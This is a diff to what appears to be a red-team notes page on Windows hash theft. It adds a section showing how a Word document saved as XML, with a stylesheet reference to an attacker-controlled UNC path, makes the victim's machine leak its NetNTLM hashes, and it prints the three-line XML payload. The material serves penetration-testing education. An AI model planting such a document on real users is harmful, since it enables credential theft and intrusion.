@@ -124,6 +124,26 @@ Executing the file.rtf on the victim system gives away user's hashes:
 
 ![](../.gitbook/assets/rtf-hashes.gif)
 
+## Execution via .XML
+
+MS Word Documents can be saved as .xml:
+
+![](../.gitbook/assets/screenshot-from-2018-12-09-16-23-39.png)
+
+This can be exploited by including a tag that requests the document stylesheet \(line 3\) from an attacker controlled server. The victim system will share its NetNTLM hashes with the attacker when attempting to authenticate to the attacker's system:
+
+```markup
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<?mso-application progid="Word.Document"?>
+<?xml-stylesheet type="text/xsl" href="\\10.0.0.5\bad.xsl" ?>
+```
+
+Below is the attack illustrated:
+
+![](../.gitbook/assets/peek-2018-12-09-16-44.gif)
+
+{% file src="../.gitbook/assets/test-xls-stylesheet.xml" caption="test-xls-stylesheet.xml" %}
+
 ## References
 
 {% embed url="http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf" %}
@@ -133,4 +153,6 @@ Executing the file.rtf on the victim system gives away user's hashes:
 {% embed url="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/" %}
 
 {% embed url="https://medium.com/@markmotig/a-better-way-to-capture-hashes-with-no-user-interaction-by-markmo-bd1569bfa208" %}
+
+{% embed url="https://bohops.com/2018/08/04/capturing-netntlm-hashes-with-office-dot-xml-documents/" %}
 
